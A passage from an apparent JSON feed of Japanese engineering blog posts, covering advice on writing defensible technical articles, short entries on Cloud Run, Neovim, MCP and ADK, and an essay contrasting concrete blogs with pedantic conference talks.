「XX社の2024年1月の技術レポート（参考リンク）によれば、このアプローチでは平均20倍の処理速度向上が報告されています」出典は、公式ドキュメント、ピアレビューされた論文、広く信頼されているブログやカンファレンス発表などが理想的です。引用する際は、公開日も含めると時間的コンテキストが明確になります。出典がない場合は、自分の検証方法と結果を詳細に記述し、再現可能性を担保しましょう。「私は以下の環境でAとBの方法を各100回実行し、平均実行時間を比較しました。使用したベンチマークコードはこちらです...」という形で、検証プロセスを透明にすることで、読者自身が結果を確認できるようにします。特に重要なのは、相関と因果を混同しないことです。「XXを導入した後にパフォーマンスが向上した」と書くより、「XXを導入したことで、具体的にこのような理由からパフォーマンスが向上した」と因果関係を明確にする方が誠実です。防御力の高い構成テクニック批判を先取りする構成防御力の高い記事は、想定される批判や誤解を先取りして対応します：導入部で限定条件を明示する: 記事の冒頭で適用範囲を明確にしましょう。「このアプローチはスタートアップの小規模チームに適しています」「エンタープライズ環境での大規模データ処理を想定しています」など、読者が自分の状況に当てはまるかどうかを判断できるようにします。「よくある誤解」セクションを設ける: 技術的な選択や手法には、しばしば同じ誤解が繰り返されます。「XXは遅い」「YYはスケーリングできない」といった一般的な誤解に対して、データや実例に基づいた反論を準備しておくことで、コメント欄での同じ議論の繰り返しを避けられます。複数の代替案を併記する: 自分の推奨する方法だけでなく、代替アプローチも説明し、それぞれの長所と短所、適した状況を比較すると、公平で包括的な印象を与えます。「私たちはAを選択しましたが、以下のような状況ではBやCも有効な選択肢になります」という形式は、読者の多様なニーズに応える懐の深さを示します。構成例：問題の定義と重要性解決策を選ぶ際の考慮事項検討した代替案とそれぞれの長所・短所最終的に選んだアプローチとその理由実装の詳細と得られた結果よくある誤解と回答適用限界と将来の発展可能性異なる立場への配慮読者は様々な立場や専門性を持っています。フロントエンド開発者、バックエンド開発者、マネージャーなど、異なる役割からの見方も示すことで、幅広い共感を得られます。技術的選択を説明する際は、技術的メリットだけでなく、ビジネス的な影響や開発者体験など、複数の視点から評価することが重要です。例えば：開発者視点：「このアプローチは学習曲線がやや急ですが、一度習得すると生産性が向上します」運用視点：「デプロイの複雑さは増しますが、個別コンポーネントの更新が容易になります」ビジネス視点：「開発初期のコストは高くなりますが、長期的なメンテナンスコストが削減されます」特に効果的なのは、自分と異なる立場の人の懸念を認識し、それに対応することです。「フロントエンド開発者にとっては、このAPIの複雑さは課題かもしれませんが、以下のようなアプローチでシンプルなインターフェースを提供できます...」というように、異なる立場の読者が感じるかもしれない反論を先回りして対応すると、包括的な印象を与えられます。見出しと結論の工夫見出しは記事の骨格であり、読者が最初に目を通す部分です。見出しは主張ではなくトピックを示すようにすることで、中立的で探求的な印象を与えられます。防御力の低い見出し: 「モノリシックアーキテクチャは時代遅れ」防御力の高い見出し: 「モノリシックアーキテクチャとマイクロサービスの比較」見出しの階層構造も重要です。論理的に整理された見出し構造は、内容の理解を助け、「この著者は論理的に考えている」という信頼感を生み出します。また、見出しだけを読んでも記事の全体像が把握できるように設計すると、読者は自分に必要な部分を効率的に見つけられます。結論部分は特に注意が必要です。結論は余地を残すことで防御力が高まります。防御力の低い結論: 「すべての企業はマイクロサービスに移行すべきです」防御力の高い結論: 「私たちのケースではマイクロサービスへの移行が効果的でしたが、システムの複雑さやチーム状況によっては、モノリシックアーキテクチャも有効な選択肢です」結論では、自分の経験から得られた洞察を共有しつつも、読者自身が判断するための視点を提供するアプローチが効果的です。「私の経験からの重要な教訓は〜ですが、あなたの状況によっては以下の点を考慮すると良いでしょう」という形式は、押し付けがましくなく、かつ価値ある指針を提供できます。批判への対応と心構え「事実」と「解釈」の違いを理解する「事実だから否定していい」は最大の勘違いです。事実は解釈の一側面に過ぎず、あなたの視点も相手の視点も等しく重要です。例えば、「このアプローチはメモリ使用量が多い」という事実に対して、「だからこのアプローチは悪い」という解釈と「これは豊富なメモリを活用して処理速度を向上させる戦略だ」という解釈は、同じ事実から生まれる異なる視点です。批判的なコメントの多くは、こうした解釈の違いから生じています。対応のポイントは、事実と解釈を分離することです。「ご指摘の通り、メモリ使用量は増加します。私たちの状況ではメモリよりも処理速度が優先事項でしたが、メモリ制約が厳しい環境では別のアプローチが適しているでしょう」というように、事実を認めつつ、解釈の違いを尊重する姿勢が建設的な対話につながります。建設的なフィードバックを活かすすべての批判が悪意あるわけではありません。改善につながるフィードバックは感謝して受け入れましょう。礼儀を持って書かれた文章には礼儀を持って返しましょう。建設的フィードバックの見分け方：具体的な点を指摘している代替案や改善案を提示している敬意ある言葉遣いで表現されている個人ではなく内容に焦点を当てているこのようなフィードバックには、まず感謝の意を表し、その後で内容に対応するのが効果的です。「貴重なご指摘ありがとうございます。確かにその点は考慮すべきでした」という謝意から始めることで、対話の基盤を築けます。特に重要なのは、フィードバックが記事の改善につながった場合、その貢献を明示的に認めることです。「読者のAさんからのフィードバックを基に、この部分を更新しました」といった形で貢献を認めると、コミュニティ全体の協力的な雰囲気を促進できます。過剰な期待を持たない過剰な期待が否定の感情を生み出します。すべての人があなたの記事を理解し賛同することを期待せず、「100点満点の記事」ではなく「誰かの役に立つ記事」を目指しましょう。技術分野では特に、「正しさ」に対する執着が強い傾向があります。しかし、多くの技術的選択は、絶対的な正誤ではなく、特定の状況やニーズに対する適合性の問題です。自分の提案が「最適解」ではなく「一つの有効なアプローチ」であることを心に留めておくと、批判に対して感情的になりにくくなります。実際の数字として考えると：あなたの記事が1000人に読まれた場合、990人が何も言わず、9人が「参考になった」と言い、1人が批判することは珍しくありません。その1人の批判だけに注目すると、不当に否定的な印象を持ってしまいます。「批判は注目されやすいが、大多数の満足した読者は声を上げない」という非対称性を意識しましょう。明らかな失礼への対応馬鹿にされたら戦いしか残されていない場合もありますが、感情的にならず以下のような対応が効果的です：丁寧かつ簡潔に応答する: 「お気持ちは理解しましたが、もう少し建設的な形でご意見いただけると嬉しいです」というように、感情的に反応せず、対話の質を上げることを促します。コミュニティルール違反は適切に報告する: 明らかな罵倒や人格攻撃などは、多くのプラットフォームのコミュニティガイドラインに違反します。そのような場合は、反応せずに適切な報告手段を利用しましょう。非公開の場で対話を試みる: 「詳しいご意見をお聞かせいただけると助かります。DMでご連絡いただけませんか？」と提案することで、公開の場での感情的な応酬を避けられます。必要に応じてブロック機能を使用する: 継続的な嫌がらせや明らかな荒らし行為に対しては、自己防衛のためにブロック機能を利用することも正当な選択です。重要なのは、少数の攻撃的コメントに大量のエネルギーを消費しないことです。批判者の中には、あなたを感情的にさせること自体が目的の人もいます。そのような人に貴重な時間と精神的エネルギーを奪われることは、あなたの読者にとっても損失です。「防御」とは時に「攻撃に対して反撃する」ことではなく、「攻撃の影響を最小限に抑える」ことを意味します。最も強力な防御は、時に無反応であることを覚えておきましょう。執筆前の準備と実践自分のバイアスを認識する執筆前に「私はこの技術についてどんな思い込みを持っているか」と自問し、自分のバイアスを認識しましょう。技術的バイアスの例：- 特定の言語やフレームワークへの愛着- 特定のアーキテクチャパターンへの傾倒- 最新技術への過度な期待- レガシーシステムへの不当な否定役割バイアスの例：- バックエンド開発者としてのパフォーマンス重視- フロントエンド開発者としてのUX重視- インフラエンジニアとしての安定性重視- マネージャーとしてのプロジェクト進行スピード重視自分のバイアスを認識することは、それを否定することではなく、むしろそれを適切に開示し、他の視点も尊重する姿勢を示すことです。「私はパフォーマンス重視のバックエンドエンジニアとして見ていますが、フロントエンド開発者にとっては別の優先事項があるでしょう」というように、自分の視点を自覚的に提示することで、読者も自分の立場との違いを理解しやすくなります。執筆前の自己対話以下の質問に自分で答えることで、記事の焦点と防御力が高まります：この記事で伝えたい最も重要なことは何か？中心となるメッセージを明確にし、それを支える論点を整理します。一つの記事で伝えようとする内容が多すぎると、焦点がぼやけて批判を受けやすくなります。想定読者は誰で、どんな前提知識を持っているか？読者層を具体的にイメージし、その知識レベルに合わせた説明の詳しさを調整します。初心者向け記事なのに前提知識を要求しすぎたり、逆に熟練者向けなのに基本的すぎる説明をすると、「的外れ」という批判を受けやすくなります。どんな反論が予想され、それにどう対応するか？想定される主な反論をリストアップし、それぞれに対する回答を準備します。特に重要な反論は、記事本文で先回りして対応することも検討します。この内容の確信度はどの程度か？自分の主張にどの程度の確信を持っているかを評価し、その確信度を文章の調子に反映させます。高い確信がある部分は断言的に、確信が低い部分は探索的な表現にすることで、「間違いではないが、確信も持てない」という微妙な領域も適切に表現できます。信頼できる人のレビュー可能であれば、公開前に信頼できる人に読んでもらいましょう。彼らが感じた違和感は、他の読者も同様に感じる可能性があります。効果的なレビュー依頼のコツ：- 具体的な質問を準備する（「全体的にどう？」ではなく「この部分の説明は明確か？」など）- 批判的なフィードバックを歓迎する姿勢を示す- 技術的に詳しい人だけでなく、想定読者に近い知識レベルの人にも見てもらう- 十分な時間的余裕を持ってレビューを依頼するレビューで指摘された問題は、公開後に読者から指摘される可能性が高い部分です。この段階で修正しておくことで、公開後の批判を大幅に減らせます。学び続ける姿勢を示す「今後さらに調査したい」「まだ理解しきれていない部分がある」と認めることは、弱さではなく誠実さです。学び続ける姿勢を示すことで、「絶対に正しい」という固い主張を避けられます。専門家であることと、全てを知っていることは別です。特にIT分野では技術の変化が早く、常に学び続ける姿勢が重要です。「この記事執筆時点ではXXが最新でしたが、その後の発展により状況が変わっている可能性があります」というような但し書きは、記事の「賞味期限」を明示する役割も果たします。記事の最後に「今後の展望」や「さらなる調査ポイント」を設けることで、その話題に対する継続的な関心と探求姿勢を示せます。これは読者に「完結した知識」ではなく「進行中の探求」として内容を捉えてもらうのに役立ちます。おわりにそういうわけで、長々と話してきましたが、結局のところ完璧な文章なんてものは、空を飛ぶ象と同じくらい見つけるのが難しいのです。ある日突然空を飛ぶ象が現れたら、それはそれで困ってしまいますけどね。不思議なことに、私たちは「正しさ」というものにやたらとこだわる生き物なのですが、太陽の光が当たる角度によって、同じ景色でも全く違って見えることがあるように、「事実」というものも見る角度によって姿を変えるものなのです。そう考えると、一つの角度からしか見ていない私たちが、絶対の正しさを主張するというのは、少し滑稽なことかもしれません。それでも、あなたの見た景色、あなたの体験した不思議な出来事は、誰かにとっての道しるべになる可能性があるのです。あなたが迷った場所で、誰かが道に迷わないように。あなたが発見した小さな喜びを、誰かも同じように発見できるように。スイッチ！作者:チップ・ハース,ダン・ハース早川書房Amazon","isoDate":"2025-04-15T01:12:47.000Z","dateMiliSeconds":1744679567000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud RunでIAM認証する","link":"https://blog.atusy.net/2025/04/15/cloud-run-with-iam/","contentSnippet":"開発中のサービスをGoogle Cloud Runで検証するとき、IAM認証のしかたが分からなかったのでメモ。コンソールやらコマンドやらグリグリするんしんどいなと思ったので、terraformでやってみた。","isoDate":"2025-04-15T00:00:00.000Z","dateMiliSeconds":1744675200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Neovimでファイルタイプ判定にShebangを使う","link":"https://blog.atusy.net/2025/04/15/nvim-filetype-matching-with-shebang/","contentSnippet":"vim.filetype.addを使うと、指定したパターンごとのファイル名やフルパスに対して、ファイルタイプの判定ロジックを追加できるよ。#!/usr/bin/env -S deno ...のようなshebangを使った実行ファイルの判定を紹介するよ。","isoDate":"2025-04-15T00:00:00.000Z","dateMiliSeconds":1744675200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ディレクトリ構成の基本原則","link":"https://sreake.com/blog/directory-structure-good-practice/","contentSnippet":"こんにちは。スリーシェイクの中原です。 プロジェクトが大きくなるにつれて「メンテナンスがしづらい」「開発スピードが遅い」と悩みを抱える要因の一つに「ディレクトリ構造がイケてない」があると考えています。 本日は、そういった […]The post ディレクトリ構成の基本原則 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-14T03:44:43.000Z","dateMiliSeconds":1744602283000,"authorName":"Sreake","authorId":"Sreake"},{"title":"genai-toolbox を実装して mcp server として公開し adk から使ってみる","link":"https://zenn.dev/satohjohn/articles/dbf4afed585680","contentSnippet":"mcp server を作ってみるということで、genai-toolbox という物があるのでそれを元にやっていきますhttps://github.com/googleapis/genai-toolboxこちらは、各 DB への接続情報と、どういう SQL を実行するかを yaml、または、http の baseurl と request parameter などで記載することで tool を作成することができます。接続先は図にもある形になると思います。https://github.com/googleapis/genai-toolbox/raw/main/docs/en/get...","isoDate":"2025-04-13T01:54:27.000Z","dateMiliSeconds":1744509267000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"codecompanion.nvimでOpenAI互換APIを利用する","link":"https://blog.atusy.net/2025/04/13/codecompanion-adapter/","contentSnippet":"codecompanion.nvimは未対応なサービスとチャットする方法としてカスタムアダプタの定義・登録があります。特にOpenAI互換APIを利用する場合は、xAIのアダプタを参考にすることで、簡単に実装できます。","isoDate":"2025-04-13T00:00:00.000Z","dateMiliSeconds":1744502400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"既存の mcp を adk 経由で叩いてみる。 playwright を使う。","link":"https://zenn.dev/satohjohn/articles/68bdde2842e8b4","contentSnippet":"mcp の client に付いて詳しくなりたいと思いつつ adk についてもやりたいのでチョット調べてみます。今回は playwright の mcp に繋いでみようと思います。https://mcp.so/server/playwright-mcp/microsoft?tab=contentplaywright は別サーバで立てるような想定で考えておきます。そのためドキュメントにある通り以下のように記載します$ npx @playwright/mcp@latest --port 8931Listening on http://localhost:8931Put this...","isoDate":"2025-04-12T10:12:09.000Z","dateMiliSeconds":1744452729000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK で作った agent を mcp server で公開する","link":"https://zenn.dev/satohjohn/articles/48a82ff7de531b","contentSnippet":"ほぼ前回の続きhttps://zenn.dev/satohjohn/articles/b23bd65c289257A2A を調べてたんですがその前に mcp 何も知らんということで実装しながら手で覚えていきます。前回使っていた code_agent (sequential_agent) を公開できるようにします。ADK の agent を作ったら、それを mcp server として公開ができる AgentTool というものがあるので、それを使います。https://google.github.io/adk-docs/tools/function-tools/#3-agent...","isoDate":"2025-04-11T16:21:06.000Z","dateMiliSeconds":1744388466000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK + Cloud Run を動かす","link":"https://zenn.dev/satohjohn/articles/b23bd65c289257","contentSnippet":"Google Cloud Next \'25 に参加してます。そのうち会社のほうで参加レポートを出します。こちらは ADK(Agent Development Kit、Android ではない) のメモ書きのようなものです2025/04/11 時点だと python でしか ADK はリリースされていないようです。 Cloud Run で動かすCloud Run で動かす方法自体は https://google.github.io/adk-docs/deploy/cloud-run/ に記載されていますのでほぼこちらを参考にお願いします。ディレクトリやファイルは以下のとおりで...","isoDate":"2025-04-11T08:02:18.000Z","dateMiliSeconds":1744358538000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞","link":"https://sreake.com/blog/2025-google-cloud-partner-of-the-year/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年4月9日に、「2025 Google Cloud Partner of the Year」において「Infrastructure Modernization Partner of the Year - Japan」を受賞したことをお知らせします。The post スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-09T01:00:00.000Z","dateMiliSeconds":1744160400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Geminiとリアルタイム音声会話できるWebアプリの作り方","link":"https://sreake.com/blog/gemini-realtime-voice-chat-app/","contentSnippet":"はじめに 現在、生成AIを利用したアプリケーションが増加しています。その多くはテキストを中心としたものですが、アプリケーションによっては音声や動画でのやり取りが必要となることもあります。これまで生成AIとの音声・動画のや […]The post Geminiとリアルタイム音声会話できるWebアプリの作り方 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-08T06:04:03.000Z","dateMiliSeconds":1744092243000,"authorName":"Sreake","authorId":"Sreake"},{"title":"n8n on Cloud Run （ツール比較から選定まで）","link":"https://zenn.dev/meziron/articles/bff3ac566f8b93","contentSnippet":"はじめにこんにちは！日々の業務や個人開発で、繰り返し行う作業や複数のサービス間でのデータ連携に「もっと楽にならないかな？」と感じることはありませんか？私もその一人で、ワークフロー自動化ツールの導入を検討し始めました。世の中にはZapierやIFTTTといったSaaS型の有名なツールがありますが、今回はオープンソースでセルフホストも可能な選択肢を中心に比較検討しました。この記事では、まず私がなぜ n8n を選んだのか、その理由を説明します。そして後半では、選定したn8nを Terraform を使用して Cloud Run 上に構築した際の具体的な手順や構成について解説します。...","isoDate":"2025-04-08T04:53:10.000Z","dateMiliSeconds":1744087990000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"mcphub.nvimでNeovimでもMCPを使う","link":"https://blog.atusy.net/2025/04/08/mcphub-nvim/","contentSnippet":"MCP（Model Context Protocol）をNeovimで使うためのmcphub.nvimの導入方法を紹介します。codecompanion.nvimなどのAIチャットプラグインに@mcpと入力するだけで、状況に合わせてツールを選択してくれるので凄く便利。","isoDate":"2025-04-08T00:00:00.000Z","dateMiliSeconds":1744070400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"エンジニアブログは技術的であるべきで登壇は衒学的であると思う理由","link":"https://syu-m-5151.hatenablog.com/entry/2025/04/07/181150","contentSnippet":"はじめにあなたは最後に技術的な記事を読んだとき、何を求めていただろうか？この二つの問いに対する答えは、おそらく大きく異なるのではないだろうか。記事を読むとき、私は再現可能な手順、明確なコード例、具体的な問題解決の道筋を期待する。一方、技術発表を聞くとき、新たな視点やアイデア、そして時に「なるほど、そういう考え方があるのか」という気づきを求めている。技術を共有する手段として、ブログを書き、カンファレンスで登壇する。一見すると同じ「知識共有」という行為に見えるが、この二つは根本的に異なる体験を生み出している。ブログは時間に縛られず、読者が自分のペースで情報を咀嚼できる。一方、登壇は限られた時間の中で、話者の熱量や会場の空気感とともに知識が伝わる。この違いは偶然ではなく、それぞれのメディアには、最適な伝え方があると私は考えている。本稿では、私個人の経験から、エンジニアブログが技術的であるべき理由と、登壇が（ある意味で）衒学的(げんがくてき)である方が効果的である可能性について考察していく。もちろん、これはあくまで一つの視点に過ぎない。技術共有の形は人それぞれであり、正解は一つではないだろう。はじめにエンジニアブログが技術的であるべき理由参照性と再現性の重要性長期的な価値実装の痕跡としての価値集合知の形成と技術の民主化未来の自分への投資思考プロセスの可視化登壇が衒学的であっても良い理由衒学的とは何か「見せかけの深さ」が生む魅力とモチベーション「わかった気にさせる」テクニックと一過性の特性ステータスシンボルとしての衒学記憶に残るメンタルモデルの構築異分野からの知見取り込みの触媒衒学的アプローチの価値と限界まとめエンジニアブログが技術的であるべき理由技術ブログの書き方はこちらでお願いします。syu-m-5151.hatenablog.com参照性と再現性の重要性エンジニアブログの重要な特徴は、読者がいつでも立ち返ることができる参照点となることです。コードの実装例、設定手順、トラブルシューティングの方法など、技術的な内容は「再現できる」ことが最も重要です。技術的であるということは、単に難しい言葉を使うことではなく、読者が同じ結果を得られるように明確で具体的な手順を提供することです。例えば、クラウドでサーバーレスアプリケーションを構築する方法を説明するブログ記事では、使用するサービス、必要な設定、コード例、発生しうる問題とその解決策など、実践的で具体的な情報が求められます。長期的な価値技術的なブログ記事は、時間が経過しても価値を保ちます。もちろんテクノロジーは進化しますが、基本的な概念や問題解決のアプローチは長く参照されることがあります。「どのようにして特定の問題を解決したか」という記録は、数年後の同様の問題に直面したエンジニアにとって貴重な資料となります。例えば、5年前に書かれたコンテナ技術のネットワーク問題のデバッグ方法に関する記事は、現在でも参考になることが多いです。具体的な実装の痕跡は、技術の進化に関わらず価値を持ち続けるのです。実装の痕跡としての価値技術的なブログ記事の価値は、「実際にやってみた痕跡」が残ることです。抽象的な概念や理論ではなく、「この実装でこの問題に直面し、このように解決した」という具体的な記録は、他のエンジニアにとって何物にも代えがたい財産となります。コードスニペット、設定ファイル、エラーメッセージとその対処法などは、まさに泥臭いエンジニアリングの証であり、読者が同じ問題に直面したときの救いの手となります。理論や概念を語るのは簡単ですが、実際の実装の痕跡を残すことこそ、技術ブログの本質的な価値と言えるでしょう。ブログの目的は、実際に同じ道を歩んでいる人の助けになることだからです。集合知の形成と技術の民主化技術的なブログ記事は、個人の経験を超えた「集合知」の形成に貢献します。特に大企業や専門家だけが持っていた知識が、個人のブログを通じて広く共有されることで、技術の民主化が進みます。オープンソースの精神と同様に、技術的なブログは知識のバリアを取り払い、誰もが高度な技術にアクセスできる環境を作り出します。例えば、以前は高価な書籍や専門的なトレーニングでしか学べなかった最先端の技術が、今では個人のブログを通じて無料で学べるようになっています。この知識の解放こそが、技術革新のスピードを加速させる原動力となっています。未来の自分への投資技術ブログを書くことは、未来の自分への最高の投資でもあります。今日困難を乗り越えた方法を記録しておくことは、数ヶ月後、数年後に同じ問題に直面したときの自分自身へのギフトとなります。「あれ、この問題以前にも解決したはずだが、どうやったんだっけ？」という状況は、エンジニアなら誰もが経験するものです。自分のブログは、検索エンジンよりも信頼できる個人的な知識ベースとなり、問題解決の時間を大幅に短縮してくれます。さらに、記録する行為そのものが理解を深め、知識を定着させるため、学習効率も向上します。思考プロセスの可視化優れた技術ブログは、単に「何を」実装したかだけでなく、「なぜそうしたのか」「他にどんな選択肢を検討したのか」という思考プロセスも含みます。この思考の軌跡を残すことで、技術選択の背後にある意思決定の流れが明らかになり、読者はより深い文脈で技術を理解できます。例えば、「Aという技術とBという技術を比較検討した結果、こういう理由でAを選んだ」という記述は、単にAの使い方を説明するよりも価値があります。なぜなら、読者は自分の状況に照らし合わせて意思決定できるようになるからです。思考プロセスの共有は、テクニックだけでなく技術的判断力も養う助けとなります。登壇が衒学的であっても良い理由衒学的とは何かまず「衒学的(げんがくてき)」という言葉について整理しておきましょう。衒学的とは、本質的な理解が伴わないにもかかわらず、学識があるように見せかけ、それを誇示するような様子を指します。つまり、実際には深い知識や経験がなくても、難解な専門用語や引用を多用し、表面的に「賢そうに見せる」テクニックと言えるでしょう。登壇において、この「賢そうに見せる」という要素が、皮肉にも効果的である理由を考えていきます。また、これらは外部登壇を指し社内のプレゼンテーションとは別物ですので御容赦下さい。「見せかけの深さ」が生む魅力とモチベーション登壇の場では、実は技術的な詳細よりも「語り方」や「見せ方」が重要になることが多いのではないかと私は感じています。難解な概念や用語を織り交ぜ、「これは単なる技術ではなく、哲学なのだ」と語ることで、聴衆に「深い知見を得た」という錯覚を与えることができます。例えば、マイクロサービスアーキテクチャの実装という話題でも、具体的な実装方法よりも「組織設計との整合性」「分散システムの哲学的背景」などと語れば、特に具体的な内容がなくても「深い話を聞いた」という満足感を聴衆に与えることができるのです。私個人の考えでは、登壇の一つの重要な目的は、聴衆を「やる気にさせること」であり、具体的な方法論よりも「そういうアプローチもあるのか！」という気づきと挑戦意欲を引き出すことにあります。もちろん、これは私の一意見であり、登壇の目的は発表者それぞれが自由に決めるものです。聴衆が実際に行動を起こす可能性を高めるために解決策の提示が効果的であれば、それも取り入れるべきでしょう。しかし実装の苦労や具体的な失敗談よりも、抽象的な概念を語る方が「賢そう」に見えるという側面があるのも、一つの観察です。登壇スタイルは千差万別で、どれが正解というものではありません。「わかった気にさせる」テクニックと一過性の特性登壇は一過性のメディアです。登壇資料が公開される可能性が高いとはいえ、その場で聞くことと読むことでは体験や雰囲気が大きく異なります。実際には聴衆のほとんどは具体的な技術内容を覚えて帰ることはできないことが多いでしょう。それよりも「あの人は賢そうだった」「深い話だった気がする」という印象だけが残ることが少なくありません。私の経験では、登壇の短い時間内で、全ての文脈やトレードオフを理解してもらい、「なぜこういう判断をしたのか」を完全に伝えることはほぼ不可能です。実際の開発においては数週間から数ヶ月かけて検討したことを、わずか30分や1時間で説明するには限界があります。それぞれの登壇者が、この制約の中でベストだと思う方法を選択していると思います。この特性を踏まえると、実装の詳細や技術的な苦労よりも、引用や専門用語、抽象的な概念を散りばめることで「わかった気にさせる」アプローチが生まれるのも理解できます。私の考えでは、登壇の目的の一つは、人を分かった気にさせてやる気を引き出すことにあります。聴衆は具体的に何を学んだかを説明できなくても、「深い話を聞いた」という満足感と「自分も挑戦してみよう」というモチベーションを得ることができるかもしれません。もちろん、別の目的や価値観を持って登壇に臨む人もいて、それも素晴らしいことだと思います。もちろん、聴衆のやる気を引き出すために具体的な解決策を提示することが効果的であれば、それも積極的に取り入れるべきでしょう。しかし多くの場合、登壇者にとっても、抽象的な概念を語る方が準備も楽で「賢そうに見える」という都合の良さがあります。ステータスシンボルとしての衒学衒学的な登壇は、皮肉にもコミュニティ内での一種のステータスシンボルとなっています。「実装の詳細を語る人」より「大きな概念や哲学を語る人」の方が尊敬されるという暗黙の序列が形成されているのです。技術カンファレンスで最も拍手を浴びるのは、具体的な実装方法を丁寧に説明した発表ではなく、抽象的な概念を難解な用語で彩った発表であることが多いのは、この現象の表れと言えるでしょう。エンジニアであれば誰しも「コードを書く人」より「アーキテクトやコンサルタント」のように見られたいという欲求があり、衒学的な登壇はそれを満たす手段となっています。記憶に残るメンタルモデルの構築例えば、分散システムの説明で「ビザンチン将軍問題」や「CAP定理」といった概念を取り上げることは、単なる実装テクニックの説明よりも聴衆の理解と記憶に残りやすいものです。これらの抽象的なモデルは「問題のやり方」ではなく「問題の捉え方」や「考え方」を提供し、聴衆が様々な状況で応用できる思考ツールとなります。衒学的に思えるこうした抽象化は、表面的な知識の誇示ではなく、実は技術の本質をより効果的に伝えるための有効な手段となり得るのです。特に登壇という限られた時間の中では、具体的な細部よりも「考え方」を伝えることの方が、長期的な価値を生み出す可能性が高いと思います。異分野からの知見取り込みの触媒衒学的なアプローチの興味深い側面として、それが異なる専門分野からの知見を技術の文脈に取り入れる触媒になることがあります。哲学、経済学、心理学、生物学などの概念を技術的課題と結びつけることで、技術コミュニティに新しい視点がもたらされるのです。例えば、システム設計において「アンチフラジャイル」（ナシーム・タレブの概念）や「レジリエンス工学」といった他分野からの概念を導入することで、従来のエンジニアリングの枠を超えた発想が生まれます。一見すると衒学的に見えるこうした「知の越境」は、実は技術の進化において重要な役割を果たしています。異分野の知見を適切に取り入れる衒学的アプローチは、単なる見せかけではなく、技術コミュニティに真の価値をもたらし得るものです。特に複雑な問題に対して、単一分野の知見だけでは不十分な場合、こうした学際的な視点は革新的な解決策を生み出す源泉となり得ます。衒学的アプローチの価値と限界「具体」と「抽象」は物事の捉え方や表現の仕方において相対的な関係性を持ちます。登壇における衒学的アプローチは、多くの場合、抽象度を高めた表現を用いることで成り立っています。抽象的な表現は、個別の事例を超えた共通点や法則性を見出し、多くの状況に適用できる知見を提供できるという利点があります。具体的な表現は直観的でわかりやすく、個々の事例や実装を明確に伝えますが、抽象的な表現は多くの事象に共通する本質や性質を簡潔にまとめることができます。聴衆によって「しっくりくる表現」は異なり、抽象的な概念が腑に落ちる人もいれば、具体例から理解を深める人もいます。衒学的と思われる表現であっても、それが聴衆の一部にとって心に響くものであれば、それは価値あるコミュニケーションと言えるのではないでしょうか。具体と抽象を行き来する思考は、問題解決やコミュニケーション能力を高める上でも重要です。登壇者が衒学的に見える抽象的表現を用いつつも、適切なタイミングで具体例に降りてくる「往復」ができれば、より効果的な知識共有が可能になると思います。以上のような考察は、あくまで個人的な観察と意見です。技術コミュニティには様々な価値観があり、登壇のスタイルも多様であるべきだと思います。優れたエンジニアでも、登壇の場では衒学的になることを求められ、それに応えることでキャリアを築いていく側面があるように感じます。私の見解としては、実装の詳細や技術的な苦労話はブログという形式で書き残しておき、登壇では適度に抽象度を上げた概念を語るという使い分けは、それぞれのメディアの特性を活かした一つのアプローチかもしれません。ブログであれば、読者は自分のペースで何度も読み返し、理解を深めることができます。一方、登壇では限られた時間で複雑な文脈を伝えることは難しく、聴衆の注意を引きつつ主要なメッセージだけを印象づける技術が必要になるケースが多いと感じています。しかし、登壇が衒学的すぎることにも明らかな危険性があります。実体のない難解な言葉だけで埋め尽くされた発表は、短期的には印象的に見えても、長期的には聴衆の信頼を失います。「この人は話が上手いだけで、実際には何も伝えていない」と見抜かれれば、せっかくの登壇も台無しではないでしょうか。また、あまりに現実から乖離した抽象論ばかりでは、聴衆が実際の業務に持ち帰れる価値が少なく、最終的な目的である「やる気にさせる」ことにも失敗してしまうかもしれません。私なりに考える理想的な登壇とは、衒学的アプローチを適度に取り入れつつも、聴衆が明日から使える具体的なヒントや考え方をしっかりと提供するものです。「難解に思えるけれど、よく考えると実践的な知恵がある」という絶妙なバランスこそが、価値ある登壇の鍵かもしれませんが、これはあくまで一つの視点であり、様々な登壇スタイルがあって然るべきだと思います。エンジニアが技術的スキルに加えて、抽象的な概念を効果的に伝えるスキルを磨くことの価値は、人それぞれの考え方によると思います。重要なのは単なる見せかけではなく、本質的な価値を状況や相手に応じて適切に伝えるための表現技術ではないかと考えています。まとめエンジニアブログは具体的で技術的であることで長期的な参照価値を持ち、誰かの実際の問題解決に貢献します。一方、登壇は適度に衒学的なアプローチを取りながらも、聴衆に「深い話を聞いた」という満足感を与え、「自分も挑戦してみよう」というモチベーションを引き出すという役割があるように思います。もちろん、これはあくまで一つの見方であり、登壇やブログの形は多様であってよいと思います。「中身のない衒学」ではなく「知見を効果的に伝える技術」を身につけるべきだと考えています。限られた登壇時間と聴衆の記憶容量を考えると、物事を単純化し印象づける技術には価値がありますが、それが空虚なものであれば、長期的には信頼を失うことになると感じています。他の方は異なる価値観を持っているかもしれませんし、それも尊重されるべきです。個人的に大切だと思うのは、ブログでは誠実に技術を伝え、実際に同じ道を歩む人の助けになる一方で、登壇では効果的な伝え方を工夫しながらも本質的な価値を提供し、聴衆のやる気を引き出す、というそれぞれのメディアの特性を理解して使い分けることではないでしょうか。そして何より、「賢そうに見せる」ことと「本当に賢いこと」の違いを自分自身がしっかりと理解しておくことが重要だと思います。結局のところ、優れた技術共有とは、表面的な知識の誇示ではなく、本質的な価値をいかに効果的に伝えるかというバランスの問題なのかもしれません。メディアの特性を理解し